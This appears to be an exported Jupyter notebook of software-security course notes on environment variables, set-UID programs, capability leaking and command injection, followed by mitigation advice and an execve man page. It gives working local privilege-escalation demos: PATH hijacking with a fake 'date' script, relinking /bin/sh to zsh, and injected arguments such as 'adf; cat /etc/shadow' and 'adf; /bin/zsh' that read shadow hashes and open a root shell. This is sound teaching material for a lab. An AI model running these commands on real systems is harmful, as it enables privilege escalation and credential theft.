# Command Injection Vulnerability, Attacks and Mitigations

## Environment Variables Pitfalls
- there's no known inherent vulnerability on environment variables
- like many features of OSes, they just provide a convenient way to manage configuration settings

### Security Risks
- env vars are accessible by processes on the system; means that sensitive information stored in them such as API keys or database credentials could potentially be exposed if proper security measures not in place

### Accidental Overwriting
- since env vars are dynamic and can be changed at runtime, there's a risk of accidental overwriting
- a misconfigured or malicious process might alter the values of critical variables, leading to unexpected behavior of applications

### Debugging Challenges
- in complex systems, tracing the source of a problem can be difficult

### Dependency on External Configuration
- overreliance on environment variables for configuration settings can make it challenging to manage and version configurations, esp. in larger projects
- changes in configruations may require updates in multiple places, leading to potentital inconsistencies

### Lack of Encryption
- environment variables are typically stored in plaintext
- sensitive information if stored as env vars can be exposed

### Limited Access Control
- access control on env variables are ususally limited
- it can be challenging to ensure proper access control to preven unauthorized access and modification to sensitive variables

### Hard-Coding Pitfall
- care should be taken to access the hard-coded env vars in programs
- what if the values of the variables are modified by the malicios programs and processes?

## Environment Variables Exploitation Demo

- `today.cpp` program in `demos/envexploit` folder uses `system` API to rely on PATH variable to call date function
- can we force this program to read `/etc/passwd` file without modifying the program itself?


```python
%pwd
```




    '/home/kali/projects/SoftwareSecurity'




```python
%cd ./demos/envexploit/
```

    /home/kali/projects/SoftwareSecurity/demos/envexploit



```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/demos/envexploit



```python
! ls -al
```

    total 44
    drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .
    drwxr-xr-x 17 kali kali  4096 Jan 19 00:25 ..
    -rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile
    -rwxr-xr-x  1 kali kali   146 Jan 18 17:51 date
    -rwsr-sr-x  1 root kali 22632 Jan 18 13:57 today
    -rw-r--r--  1 kali kali   304 Jan 27 22:37 today.cpp



```python
! cat today.cpp
```

    // Wrapper program for bash date program
    
    #include <cstdio>
    #include <cstring>
    #include <cstdlib>
    
    using namespace std;
    
    int main(int argc, char* argv[]) {
        printf("Today is: ");
        // must flush stdout so system call's result is printed after
        fflush(stdout); 
        system("date");
        return 0;
    }


```python
! cat  Makefile
```

    COMPILER = g++
    
    COMPILER_FLAGS = -g -Wall -std=c++17
    
    # the build target executable program name of your choice
    PROGRAM_NAME = today
    
    CPP_FILES = today.cpp
    
    build:
    	$(COMPILER) $(COMPILER_FLAGS) $(CPP_FILES) -o $(PROGRAM_NAME)
    
    # make clean rule
    # delete object and binary files
    clean:
    	rm -f $(PROGRAM_NAME) *.o



```python
! make
```

    g++ -g -Wall -std=c++17 today.cpp -o today



```python
! ls -al
```

    total 44
    drwxr-xr-x  2 kali kali  4096 Jan 28 16:00 .
    drwxr-xr-x 17 kali kali  4096 Jan 19 00:25 ..
    -rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile
    -rwxr-xr-x  1 kali kali   146 Jan 18 17:51 date
    -rwxr-xr-x  1 kali kali 22632 Jan 28 16:00 today
    -rw-r--r--  1 kali kali   304 Jan 27 22:37 today.cpp



```python
! ./today
```

    Today is: Sun Jan 28 16:00:38 EST 2024



```python
! which date
```

    /usr/bin/date


## Exploitation of PATH env variable

- today program uses `system` API to call `date` program
- system finds `date` program by search the `PATH` variable which is in `/usr/bin/date`
- create your own "date" program; that does whatever you want it to do
- update the PATH so it finds your "date" program before finding system's `/usr/bin/date`
- you can write your program in whatever language of your choice
    - bash script is the easiest in this case
- see `date` script in the `demo/envexploit` folder
- make the program executable
- update the PATH from Terminal and run the today program


```python
! cat date
```

    #! /bin/sh
    
    # date program that reads /etc/passwd file
    
    if cat /etc/passwd; then
        echo "Woohoo I got it!"
    else
        echo "Command failed :("
    fi



```python
! chmod +x date
```


```python
! ls -al date
```

    -rwxr-xr-x 1 kali kali 146 Jan 18 17:51 date



```python
! ./date
```

    root:x:0:0:root:/root:/usr/bin/zsh
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
    _galera:x:100:65534::/nonexistent:/usr/sbin/nologin
    mysql:x:101:106:MySQL Server,,,:/nonexistent:/bin/false
    tss:x:102:107:TPM software stack,,,:/var/lib/tpm:/bin/false
    strongswan:x:103:65534::/var/lib/strongswan:/usr/sbin/nologin
    systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
    redsocks:x:104:108::/var/run/redsocks:/usr/sbin/nologin
    rwhod:x:105:65534::/var/spool/rwho:/usr/sbin/nologin
    _gophish:x:106:110::/var/lib/gophish:/usr/sbin/nologin
    iodine:x:107:65534::/run/iodine:/usr/sbin/nologin
    messagebus:x:108:111::/nonexistent:/usr/sbin/nologin
    miredo:x:109:65534::/var/run/miredo:/usr/sbin/nologin
    redis:x:110:114::/var/lib/redis:/usr/sbin/nologin
    usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    mosquitto:x:112:116::/var/lib/mosquitto:/usr/sbin/nologin
    tcpdump:x:113:118::/nonexistent:/usr/sbin/nologin
    sshd:x:114:65534::/run/sshd:/usr/sbin/nologin
    _rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
    dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    statd:x:117:65534::/var/lib/nfs:/usr/sbin/nologin
    avahi:x:118:122:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
    stunnel4:x:995:995:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
    Debian-snmp:x:119:123::/var/lib/snmp:/bin/false
    _gvm:x:120:124::/var/lib/openvas:/usr/sbin/nologin
    speech-dispatcher:x:121:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
    sslh:x:122:125::/nonexistent:/usr/sbin/nologin
    postgres:x:123:126:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    pulse:x:124:128:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
    inetsim:x:125:130::/var/lib/inetsim:/usr/sbin/nologin
    lightdm:x:126:131:Light Display Manager:/var/lib/lightdm:/bin/false
    geoclue:x:127:132::/var/lib/geoclue:/usr/sbin/nologin
    saned:x:128:134::/var/lib/saned:/usr/sbin/nologin
    polkitd:x:993:993:polkit:/nonexistent:/usr/sbin/nologin
    rtkit:x:129:135:RealtimeKit,,,:/proc:/usr/sbin/nologin
    colord:x:130:136:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
    nm-openvpn:x:131:137:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
    nm-openconnect:x:132:138:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
    kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh
    user:x:1003:1003:User user,123,232,:/home/user:/bin/bash
    Woohoo I got it!


```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ export PATH=$PWD:$PATH 
                                                                                                     
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ echo $PATH            
/home/kali/projects/SoftwareSecurity/demos/envexploit:/home/kali:/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali//home/kali/bin

(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh
bob:x:1001:1001:,,,:/home/bob:/bin/bash
Woohoo I got it!
```

## Attack Surfaces on Set-UID Programs

- the impact of exploitation of set-uid programs can be severe
- can compromise all 3 CIA triads
    - what are CIA triads?

![Attack Surfaces](./media/setuid-attacks.png)

### Attacks Via User Inputs

#### Buffer Overflow
- covered in depth later in Bufffer Overflow chapters
- overflow a buffer to run arbitrary malicious code

#### Format String Vulnerability
- covered in dpeth later in Format String chapter
- change program behavior using user inputs for format strings

### Attacks via System Inputs
- covered in Race Condition chapter

### Attacks via Environment Variables
- if the program (e.g., today program) is set-uid, you can exploit it to execute any program as the owner of the program
- if the program is root, anyone who can run this program gains root's privileges during its execution
    - esentially, it typically escalates users' privileges and that can have serious consequences
- `system(command)` is a wrapper for `/bin/sh`
    - it is invoked as `/bin/sh -c command`
    - i.e., it invokes `/bin/sh` and and asks the shell to execute the command
- `system()` passes the env vars of calling process to the new program `/bin/sh`
- in newer version of Linux (Ubuntu 20.04 and Kali 2023, e.g.), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`
- `/bin/dash` has a conutermeasure that prevents itself from being executed in a Set-UID process
    - if dash detects that it is being executed in a Set-UID prorcess, it immediately changes the effective User ID to the process's real ID -- essentially dropping the privilege
- if we update the `date` script and try to read priviledged `/etc/shadow` file, it'll fail!
- we can however update the softlink  `/bin/sh` to point to `/bin/zsh` which doesn't have the countermeasure


```python
! ls -al /bin/sh
```

    lrwxrwxrwx 1 root root 4 Jun 21  2023 /bin/sh -> dash



```python
! echo kali | sudo -S chown root today
```

    [sudo] password for kali: 


```python
! ls -al
```

    total 44
    drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .
    drwxr-xr-x 15 kali kali  4096 Jan 18 13:56 ..
    -rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile
    -rwxr-xr-x  1 kali kali    97 Jan 18 14:10 date
    -rwxr-xr-x  1 root kali 22632 Jan 18 13:57 today
    -rw-r--r--  1 kali kali   304 Jan 18 13:51 today.cpp



```python
! echo kali | sudo -S chmod +s today
```

    [sudo] password for kali: 


```python
! ls -al
```

    total 44
    drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .
    drwxr-xr-x 15 kali kali  4096 Jan 18 13:56 ..
    -rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile
    -rwxr-xr-x  1 kali kali    97 Jan 18 14:10 date
    -rwsr-sr-x  1 root kali 22632 Jan 18 13:57 today
    -rw-r--r--  1 kali kali   304 Jan 18 13:51 today.cpp



```python
! cat date 
```

    #! /bin/sh
    
    # date program that reads /etc/passwd file
    
    if cat /etc/shadow; then
        echo "Woohoo I got it!"
    else
        echo "Command failed :("
    fi


```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: cat: /etc/shadow: Permission denied
Command failed :(
```


```python
# let's create a soft link /bin/sh pointing to /bin/zsh
! echo kali | sudo -S ln -sf /bin/zsh /bin/sh
```

    [sudo] password for kali: 


```python
! ls -al /bin/sh
```

    lrwxrwxrwx 1 root root 8 Jan 18 17:46 /bin/sh -> /bin/zsh


```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: root:!:19662:0:99999:7:::
...
kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::
bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7:::
Woohoo I got it!
```

## Capability Leaking

- in some cases, privileged programs downgrade themselves during execution
- E.g., **su** program

### su
- su is a privileged set-uid program
- allows user to switch to another user (say user1 to user2)
- program starts with EUID as root and RUID as user1
- after password verification, both EUID and RUID becomes user2's (via privilege downgrading)
- such programs may lead to capability leaking if not implemented correctly
    - programs may not clean up privileged capabilities before downgrading

### Attacks via Capability Leaking
- let's look at an example program provided in `demos/capleak/` folder
- program opens a file in `/etc` in **write/append** mode
- program must be root setuid to be able to write to the `/etc` folder
- program downgrades the privilege with the RUID of the user
- it then executes `/bin/sh`
- conviniently, file descriptor value is also printed
- run the program from the Terminal to get the shell 


```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/demos/envexploit



```python
%cd ../capleak
```

    /home/kali/projects/SoftwareSecurity/demos/capleak



```python
! ls -al
```

    total 16
    drwxr-xr-x  2 kali kali 4096 Jan 18 22:32 .
    drwxr-xr-x 16 kali kali 4096 Jan 18 18:00 ..
    -rw-r--r--  1 kali kali  394 Jan 18 22:10 Makefile
    -rw-r--r--  1 kali kali  721 Jan 18 22:13 capleak.cpp



```python
! cat capleak.cpp
```

    // https://github.com/seed-labs/seed-labs/blob/master/category-software/Environment_Variable_and_SetUID/Labsetup/cap_leak.c
    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>
    
    using namespace std;
    
    int main(int argc, char* argv[]) {
        int fd;
        char *v[2];
        
        fd = open("/etc/xyz", O_RDWR | O_APPEND | O_CREAT); 
        if (fd == -1) {
            printf("Failed to open /etc/xyz\n");
            exit(1);
        }
        // print out the file descriptor value
        printf("fd is %d\n", fd);
        // FIXME - close the file
        // close(fd);
        // downgrade the privilege my making the effective uid the same as the real uid
        setuid(getuid());
        // execute /bin/sh
        v[0] = "/bin/sh"; v[1] = 0;
        execve(v[0], v, 0);
        return 0;
    }



```python
! echo kali | sudo -S make
```

    [sudo] password for kali: g++ -g -Wall -std=c++17 capleak.cpp -o capleak
    [01m[Kcapleak.cpp:[m[K In function ‘[01m[Kint[01;32m[K main[m[K(int, char**)[m[K’:
    [01m[Kcapleak.cpp:24:12:[m[K [01;35m[Kwarning: [m[KISO C++ forbids converting a string constant to ‘[01m[Kchar*[m[K’ [[01;35m[K]8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wwrite-strings-Wwrite-strings]8;;[m[K]
       24 |     v[0] = [01;35m[K"/bin/sh"[m[K; v[1] = 0;
          |            [01;35m[K^~~~~~~~~[m[K
    sudo chown root capleak
    sudo chmod +s capleak



```python
! ls -al
```

    total 48
    drwxr-xr-x  2 kali kali  4096 Jan 18 22:33 .
    drwxr-xr-x 16 kali kali  4096 Jan 18 18:00 ..
    -rw-r--r--  1 kali kali   394 Jan 18 22:10 Makefile
    -rwsr-sr-x  1 root root 30384 Jan 18 22:33 capleak
    -rw-r--r--  1 kali kali   721 Jan 18 22:13 capleak.cpp


```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/capleak]
└─$ ./capleak 
fout is 3
$ echo ABCDEF                                                                                              
ABCDEF
$ echo ABCDEF >& 3                                                                                       
$ cat /etc/xyz                                                                                             
aaa
aaaa
ABCDEF
$ exit
```

## Fix the Vulnerability

- close/destroy the file description before dropping the privelege

## Capbility Leaking in OS X - Case Study

- OS X Yosemite found vulnerable to privilege escalation attack related to capability leaking in July 2015 ( OS X 10.10 )
- added features to dynamic linker dyld 
    - DYLD_PRINT_TO_FILE environment variable
- the dynamic linker can open any file, so for root-owned Set-UID programs, it runs with root privileges 
- the dynamic linker dyld, does not close the file leading to capability leaking vulnerability


## Command Injection

- programs' often takes input from users
- if the users' input is not validated and sanitized, data can be converted into command name
    - data is then executed as command
- SQL injection is a type of command injection attack very common in SQL-driven web applications
- see `catall.cpp` file in `demos/injection` folder


```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/demos/capleak



```python
%cd ../injection
```

    /home/kali/projects/SoftwareSecurity/demos/injection



```python
! ls -al
```

    total 12
    drwxr-xr-x  2 kali kali 4096 Jan 19 00:25 .
    drwxr-xr-x 17 kali kali 4096 Jan 19 00:25 ..
    -rw-r--r--  1 kali kali  393 Jan 19 00:27 Makefile
    -rw-r--r--  1 kali kali    0 Jan 19 00:24 catall.c



```python
! cat catall.cpp
```

    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[])
    {
      char *v[3];
      char *command;
    
      if(argc < 2) {
        printf("Usage: calall <file_path>.\n");
        return 1;
      }
    
      v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
    
      command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
      sprintf(command, "%s %s", v[0], v[1]);
    
      // Use only one of the followings.
      system(command);
      // execve(v[0], v, NULL);
    
      return 0 ;
    }


```python
! echo kali | sudo -S make
```

    [sudo] password for kali: g++ -g -Wall -std=c++17 catall.cpp -o catall
    [01m[Kcatall.cpp:[m[K In function ‘[01m[Kint[01;32m[K main[m[K(int, char**)[m[K’:
    [01m[Kcatall.cpp:16:10:[m[K [01;35m[Kwarning: [m[KISO C++ forbids converting a string constant to ‘[01m[Kchar*[m[K’ [[01;35m[K]8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wwrite-strings-Wwrite-strings]8;;[m[K]
       16 |   v[0] = [01;35m[K"/bin/cat"[m[K; v[1] = argv[1]; v[2] = NULL;
          |          [01;35m[K^~~~~~~~~~[m[K
    sudo chown root catall
    sudo chmod +s catall


- you must use the "quotations" around the commands ";" separated arguments
- quotes ensure everything is passed as a single argument to the vulnurable program
- note, injecting /bin/zsh gives root but injecting  /bin/sh doesn not 

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; cat /etc/shadow"
/bin/cat: adf: No such file or directory
root:!:19662:0:99999:7:::
...
kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::
bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7::

(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; /bin/bash"
/bin/cat: adf: No such file or directory
bash-5.2$ whoami
kali
bash-5.2$ ./catall "asdf; /bin/bash"
/bin/cat: asdf: No such file or directory
bash-5.2$ exit
exit
bash-5.2$ exit
exit
                                                                                                                                                                                                                                                                                         
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; /bin/zsh" 
/bin/cat: adf: No such file or directory
x86_64-conda-linux-gnu# whoami
root
x86_64-conda-linux-gnu# id
uid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),105(netdev),117(wireshark),120(bluetooth),133(scanner),140(kaboxer)
x86_64-conda-linux-gnu# 
```

## Mitigation

- avoid `system` call if possible
- use `execve` properly instead of `system` when executing system commands from C/C++ programs
- `execve` allows you to separate the command from the input data
- `exec` family of function is lower-level compared to system and allows for granular control on how the program should be executed
- allows you to pass your own environment variables in the third argument
- replaces the current process image with a new one, executing the specified program
- you need to provide full path to the executable and explictly pass an array of arguments
    - preventing the ENV VARS overriding attack 
- not all `exec` family funcions behave similarly
    - `execlp(), execvp(), execvpe()` duplicate the actions of the shell
    - these functions can be attacked using the PATH Environment Variable
    
```bash
execve(command_name, input_data_argument, env_variables);
```

- patch the `catall.cpp` program and try to exploit it again
- see `demos/injection/secure` folder for the secure version of `cat_all` program
- compile and try the command injection again...


```python
! man execve
```

    [4mexecve[24m(2)                     System Calls Manual                    [4mexecve[24m(2)
    
    [1mNAME[0m
           execve - execute program
    
    [1mLIBRARY[0m
           Standard C library ([4mlibc[24m, [4m-lc[24m)
    
    [1mSYNOPSIS[0m
           [1m#include <unistd.h>[0m
    
           [1mint execve(const char *[4m[22mpathname[24m[1m, char *const _Nullable [4m[22margv[24m[1m[],[0m
                      [1mchar *const _Nullable [4m[22menvp[24m[1m[]);[0m
    
    [1mDESCRIPTION[0m
           [1mexecve[22m() executes the program referred to by [4mpathname[24m.  This causes the
           program  that  is  currently being run by the calling process to be re‐
           placed with a new program, with  newly  initialized  stack,  heap,  and
           (initialized and uninitialized) data segments.
    
           [4mpathname[24m  must be either a binary executable, or a script starting with
           a line of the form:
    
               [1m#![4m[22minterpreter[24m [optional-arg]
    
           For details of the latter case, see "Interpreter scripts" below.
    
           [4margv[24m is an array of pointers to strings passed to the  new  program  as
           its  command-line arguments.  By convention, the first of these strings
           (i.e., [4margv[0][24m) should contain the filename associated  with  the  file
           being  executed.   The [4margv[24m array must be terminated by a NULL pointer.
           (Thus, in the new program, [4margv[argc][24m will be NULL.)
    
           [4menvp[24m is an array of pointers to strings,  conventionally  of  the  form
           [1mkey=value[22m, which are passed as the environment of the new program.  The
           [4menvp[24m array must be terminated by a NULL pointer.
    
           This  manual  page  describes  the  Linux system call in detail; for an
           overview of the nomenclature and the many, often preferable,  standard‐
           ised  variants  of  this function provided by libc, including ones that
           search the [1mPATH [22menvironment variable, see [1mexec[22m(3).
    
           The argument vector and environment can be accessed  by  the  new  pro‐
           gram's main function, when it is defined as:
    
               int main(int argc, char *argv[], char *envp[])
    
           Note, however, that the use of a third argument to the main function is
           not  specified in POSIX.1; according to POSIX.1, the environment should
           be accessed via the external variable [1menviron[22m(7).
    
           [1mexecve[22m() does not return on success, and the  text,  initialized  data,
           uninitialized  data  (bss),  and stack of the calling process are over‐
           written according to the contents of the newly loaded program.
    
           If the current program is being ptraced, a [1mSIGTRAP [22msignal is sent to it
           after a successful [1mexecve[22m().
    
           If the set-user-ID bit is set on the program file referred to by  [4mpath‐[0m
           [4mname[24m,  then  the effective user ID of the calling process is changed to
           that of the owner of the program file.  Similarly, if the  set-group-ID
           bit  is  set  on  the  program file, then the effective group ID of the
           calling process is set to the group of the program file.
    
           The aforementioned transformations of the effective IDs  are  [4mnot[24m  per‐
           formed (i.e., the set-user-ID and set-group-ID bits are ignored) if any
           of the following is true:
    
           •  the  [4mno_new_privs[24m  attribute  is  set  for  the  calling thread (see
              [1mprctl[22m(2));
    
           •  the underlying filesystem is mounted [4mnosuid[24m (the [1mMS_NOSUID [22mflag  for
              [1mmount[22m(2)); or
    
           •  the calling process is being ptraced.
    
           The capabilities of the program file (see [1mcapabilities[22m(7)) are also ig‐
           nored if any of the above are true.
    
           The  effective  user ID of the process is copied to the saved set-user-
           ID; similarly, the effective group ID is copied to the saved set-group-
           ID.  This copying takes place after any effective ID changes that occur
           because of the set-user-ID and set-group-ID mode bits.
    
           The process's real UID and real GID, as well as its supplementary group
           IDs, are unchanged by a call to [1mexecve[22m().
    
           If the executable is an a.out dynamically linked binary executable con‐
           taining shared-library stubs, the  Linux  dynamic  linker  [1mld.so[22m(8)  is
           called  at  the  start of execution to bring needed shared objects into
           memory and link the executable with them.
    
           If the executable is a dynamically linked ELF  executable,  the  inter‐
           preter named in the PT_INTERP segment is used to load the needed shared
           objects.  This interpreter is typically [4m/lib/ld-linux.so.2[24m for binaries
           linked with glibc (see [1mld-linux.so[22m(8)).
    
       [1mEffect on process attributes[0m
           All  process  attributes  are  preserved during an [1mexecve[22m(), except the
           following:
    
           •  The dispositions of any signals that are being caught are  reset  to
              the default ([1msignal[22m(7)).
    
           •  Any alternate signal stack is not preserved ([1msigaltstack[22m(2)).
    
           •  Memory mappings are not preserved ([1mmmap[22m(2)).
    
           •  Attached System V shared memory segments are detached ([1mshmat[22m(2)).
    
           •  POSIX shared memory regions are unmapped ([1mshm_open[22m(3)).
    
           •  Open POSIX message queue descriptors are closed ([1mmq_overview[22m(7)).
    
           •  Any open POSIX named semaphores are closed ([1msem_overview[22m(7)).
    
           •  POSIX timers are not preserved ([1mtimer_create[22m(2)).
    
           •  Any open directory streams are closed ([1mopendir[22m(3)).
    
           •  Memory locks are not preserved ([1mmlock[22m(2), [1mmlockall[22m(2)).
    
           •  Exit handlers are not preserved ([1matexit[22m(3), [1mon_exit[22m(3)).
    
           •  The   floating-point  environment  is  reset  to  the  default  (see
              [1mfenv[22m(3)).
    
           The process attributes in the  preceding  list  are  all  specified  in
           POSIX.1.   The following Linux-specific process attributes are also not
           preserved during an [1mexecve[22m():
    
           •  The process's "dumpable" attribute is set to the value 1,  unless  a
              set-user-ID program, a set-group-ID program, or a program with capa‐
              bilities  is being executed, in which case the dumpable flag may in‐
              stead be reset to the value in  [4m/proc/sys/fs/suid_dumpable[24m,  in  the
              circumstances  described  under  [1mPR_SET_DUMPABLE  [22min [1mprctl[22m(2).  Note
              that changes to the "dumpable"  attribute  may  cause  ownership  of
              files  in  the process's [4m/proc/[24mpid directory to change to [4mroot:root[24m,
              as described in [1mproc[22m(5).
    
           •  The [1mprctl[22m(2) [1mPR_SET_KEEPCAPS [22mflag is cleared.
    
           •  (Since Linux 2.4.36 / 2.6.23) If a set-user-ID or set-group-ID  pro‐
              gram is being executed, then the parent death signal set by [1mprctl[22m(2)
              [1mPR_SET_PDEATHSIG [22mflag is cleared.
    
           •  The  process  name, as set by [1mprctl[22m(2) [1mPR_SET_NAME [22m(and displayed by
              [4mps[24m [4m-o[24m [4mcomm[24m), is reset to the name of the new executable file.
    
           •  The [1mSECBIT_KEEP_CAPS [4m[22msecurebits[24m  flag  is  cleared.   See  [1mcapabili‐[0m
              [1mties[22m(7).
    
           •  The termination signal is reset to [1mSIGCHLD [22m(see [1mclone[22m(2)).
    
           •  The  file  descriptor  table  is unshared, undoing the effect of the
              [1mCLONE_FILES [22mflag of [1mclone[22m(2).
    
           Note the following further points:
    
           •  All threads other than the calling thread are  destroyed  during  an
              [1mexecve[22m().   Mutexes, condition variables, and other pthreads objects
              are not preserved.
    
           •  The equivalent of [4msetlocale(LC_ALL,[24m  [4m"C")[24m  is  executed  at  program
              start-up.
    
           •  POSIX.1  specifies that the dispositions of any signals that are ig‐
              nored or set to the default are left unchanged.   POSIX.1  specifies
              one  exception:  if [1mSIGCHLD [22mis being ignored, then an implementation
              may leave the disposition unchanged or  reset  it  to  the  default;
              Linux does the former.
    
           •  Any   outstanding   asynchronous   I/O   operations   are   canceled
              ([1maio_read[22m(3), [1maio_write[22m(3)).
    
           •  For the handling of  capabilities  during  [1mexecve[22m(),  see  [1mcapabili‐[0m
              [1mties[22m(7).
    
           •  By  default,  file descriptors remain open across an [1mexecve[22m().  File
              descriptors that are marked close-on-exec are closed;  see  the  de‐
              scription  of  [1mFD_CLOEXEC  [22min  [1mfcntl[22m(2).   (If  a file descriptor is
              closed, this will cause the release of all record locks obtained  on
              the  underlying  file  by  this process.  See [1mfcntl[22m(2) for details.)
              POSIX.1 says that if file descriptors 0, 1, and 2 would otherwise be
              closed after a successful [1mexecve[22m(), and the process would gain priv‐
              ilege because the set-user-ID or set-group-ID mode bit  was  set  on
              the  executed file, then the system may open an unspecified file for
              each of these file descriptors.  As a general principle, no portable
              program, whether privileged or not, can assume that these three file
              descriptors will remain closed across an [1mexecve[22m().
    
       [1mInterpreter scripts[0m
           An interpreter script is a text file that has  execute  permission  en‐
           abled and whose first line is of the form:
    
               [1m#![4m[22minterpreter[24m [optional-arg]
    
           The [4minterpreter[24m must be a valid pathname for an executable file.
    
           If  the  [4mpathname[24m argument of [1mexecve[22m() specifies an interpreter script,
           then [4minterpreter[24m will be invoked with the following arguments:
    
               [4minterpreter[24m [optional-arg] [4mpathname[24m arg...
    
           where [4mpathname[24m is the pathname of the file specified as the first argu‐
           ment of [1mexecve[22m(), and [4marg...[24m  is the series of words pointed to by  the
           [4margv[24m  argument of [1mexecve[22m(), starting at [4margv[1][24m.  Note that there is no
           way to get the [4margv[0][24m that was passed to the [1mexecve[22m() call.
    
           For portable use, [4moptional-arg[24m should either be absent, or be specified
           as a single word (i.e., it should not contain white space);  see  NOTES
           below.
    
           Since  Linux  2.6.28, the kernel permits the interpreter of a script to
           itself be a script.  This permission is recursive, up  to  a  limit  of
           four  recursions,  so that the interpreter may be a script which is in‐
           terpreted by a script, and so on.
    
       [1mLimits on size of arguments and environment[0m
           Most UNIX implementations impose some limit on the total  size  of  the
           command-line argument ([4margv[24m) and environment ([4menvp[24m) strings that may be
           passed to a new program.  POSIX.1 allows an implementation to advertise
           this  limit using the [1mARG_MAX [22mconstant (either defined in [4m<limits.h>[24m or
           available at run time using the call [4msysconf(_SC_ARG_MAX)[24m).
    
           Before Linux 2.6.23, the memory used to store the environment and argu‐
           ment strings was limited to 32 pages (defined by  the  kernel  constant
           [1mMAX_ARG_PAGES[22m).   On architectures with a 4-kB page size, this yields a
           maximum size of 128 kB.
    
           On Linux 2.6.23 and later, most architectures support a size limit  de‐
           rived from the soft [1mRLIMIT_STACK [22mresource limit (see [1mgetrlimit[22m(2)) that
           is  in  force at the time of the [1mexecve[22m() call.  (Architectures with no
           memory management unit are excepted: they maintain the limit  that  was
           in  effect before Linux 2.6.23.)  This change allows programs to have a
           much larger argument and/or environment list.  For these architectures,
           the total size is limited to 1/4 of the allowed stack size.   (Imposing
           the  1/4-limit  ensures  that  the  new  program  always has some stack
           space.)  Additionally, the total size is limited to 3/4 of the value of
           the kernel constant [1m_STK_LIM [22m(8 MiB).  Since Linux 2.6.25,  the  kernel
